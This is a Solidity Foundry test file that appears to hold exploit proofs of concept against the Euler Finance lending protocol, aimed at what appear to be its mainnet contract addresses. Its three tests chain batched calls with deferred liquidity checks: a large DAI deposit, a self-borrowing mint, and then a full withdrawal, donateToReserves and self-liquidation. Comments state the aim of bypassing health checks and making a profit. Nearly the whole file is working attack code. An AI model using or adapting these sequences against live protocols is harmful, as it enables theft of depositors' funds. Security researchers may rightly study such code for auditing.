// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IEulerExec {
    struct EulerBatchItem {
        bool allowError;
        address proxyAddr;
        bytes data;
    }
    function batchDispatch(EulerBatchItem[] calldata items, address[] calldata deferLiquidityChecks) external;
}

interface IEToken {
    function deposit(uint subAccountId, uint amount) external;
    function withdraw(uint subAccountId, uint amount) external;
    function mint(uint subAccountId, uint amount) external;
    function burn(uint subAccountId, uint amount) external;
    function donateToReserves(uint subAccountId, uint amount) external;
    function balanceOf(address account) external view returns (uint256);
    function balanceOfUnderlying(address account) external view returns (uint256);
}

interface IDToken {
    function repay(uint subAccountId, uint amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface ILiquidation {
    function liquidate(address violator, address underlying, address collateral, uint repay, uint minYield) external;
}

contract TestEulerBatch is Test {
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant EXEC = 0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address constant MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant LIQUIDATION = 0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    
    address eDAI;
    address dDAI;
    
    function setUp() public {
        eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
        dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
        deal(DAI, address(this), 30_000_000e18);
    }

    // Test 1: Can we use batchDispatch with deferred liquidity to bypass health checks?
    function testBatchWithdrawExcess() public {
        IERC20(DAI).approve(EULER, type(uint256).max);
        
        // Build batch: deposit 20M + mint 190M + withdraw 200M (more than deposited!)
        // With deferred liquidity, individual steps won't check health
        IEulerExec.EulerBatchItem[] memory items = new IEulerExec.EulerBatchItem[](4);
        
        // 1. Enter market
        items[0] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: MARKETS,
            data: abi.encodeWithSignature("enterMarket(uint256,address)", 0, DAI)
        });
        
        // 2. Deposit 20M DAI
        items[1] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("deposit(uint256,uint256)", 0, 20_000_000e18)
        });
        
        // 3. Mint 180M (self-borrow, ~9x leverage)
        items[2] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("mint(uint256,uint256)", 0, 180_000_000e18)
        });
        
        // 4. Withdraw ALL underlying (200M+)
        items[3] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("withdraw(uint256,uint256)", 0, type(uint256).max)
        });
        
        // Defer OUR liquidity check
        address[] memory defer = new address[](1);
        defer[0] = address(this);
        
        uint256 daiBefore = IERC20(DAI).balanceOf(address(this));
        emit log_named_uint("DAI before", daiBefore);
        
        // This SHOULD revert at the deferred check, but let's try
        try IEulerExec(EXEC).batchDispatch(items, defer) {
            uint256 daiAfter = IERC20(DAI).balanceOf(address(this));
            emit log_named_uint("DAI after", daiAfter);
            emit log_named_uint("DAI profit", daiAfter > daiBefore ? daiAfter - daiBefore : 0);
            emit log("BATCH SUCCEEDED!");
        } catch (bytes memory reason) {
            emit log_named_bytes("Batch reverted", reason);
        }
    }

    // Test 2: Try donateToReserves inside a batch
    function testBatchDonate() public {
        IERC20(DAI).approve(EULER, type(uint256).max);
        
        IEulerExec.EulerBatchItem[] memory items = new IEulerExec.EulerBatchItem[](5);
        
        items[0] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: MARKETS,
            data: abi.encodeWithSignature("enterMarket(uint256,address)", 0, DAI)
        });
        
        items[1] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("deposit(uint256,uint256)", 0, 20_000_000e18)
        });
        
        items[2] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("mint(uint256,uint256)", 0, 180_000_000e18)
        });
        
        // Try donateToReserves - if it exists, this will work
        // If it doesn't exist, allowError=true will skip
        items[3] = IEulerExec.EulerBatchItem({
            allowError: true,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("donateToReserves(uint256,uint256)", 0, 100_000_000e18)
        });
        
        // Burn to reduce debt
        items[4] = IEulerExec.EulerBatchItem({
            allowError: true,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("burn(uint256,uint256)", 0, 100_000_000e18)
        });
        
        address[] memory defer = new address[](1);
        defer[0] = address(this);
        
        try IEulerExec(EXEC).batchDispatch(items, defer) {
            emit log("Batch donate succeeded!");
            uint256 eBalance = IEToken(eDAI).balanceOf(address(this));
            uint256 dBalance = IDToken(dDAI).balanceOf(address(this));
            emit log_named_uint("eDAI balance", eBalance);
            emit log_named_uint("dDAI balance", dBalance);
        } catch (bytes memory reason) {
            emit log_named_bytes("Batch donate reverted", reason);
        }
    }
    
    // Test 3: Direct batch with liquidation
    function testBatchDepositMintDonateAndLiquidate() public {
        IERC20(DAI).approve(EULER, type(uint256).max);
        
        IEulerExec.EulerBatchItem[] memory items = new IEulerExec.EulerBatchItem[](5);
        
        items[0] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: MARKETS,
            data: abi.encodeWithSignature("enterMarket(uint256,address)", 0, DAI)
        });
        items[1] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("deposit(uint256,uint256)", 0, 20_000_000e18)
        });
        items[2] = IEulerExec.EulerBatchItem({
            allowError: false,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("mint(uint256,uint256)", 0, 180_000_000e18)
        });
        // donateToReserves with allowError=true (may not exist)
        items[3] = IEulerExec.EulerBatchItem({
            allowError: true,
            proxyAddr: eDAI,
            data: abi.encodeWithSignature("donateToReserves(uint256,uint256)", 0, 150_000_000e18)
        });
        // Self-liquidate from sub-account 1
        items[4] = IEulerExec.EulerBatchItem({
            allowError: true,
            proxyAddr: LIQUIDATION,
            data: abi.encodeWithSignature("liquidate(address,address,address,uint256,uint256)", address(this), DAI, DAI, type(uint256).max, 0)
        });
        
        address[] memory defer = new address[](2);
        defer[0] = address(this);
        defer[1] = address(uint160(uint160(address(this)) ^ 1)); // sub-account 1
        
        try IEulerExec(EXEC).batchDispatch(items, defer) {
            emit log("Full batch succeeded!");
        } catch (bytes memory reason) {
            emit log_named_bytes("Full batch reverted", reason);
        }
    }

    receive() external payable {}
}
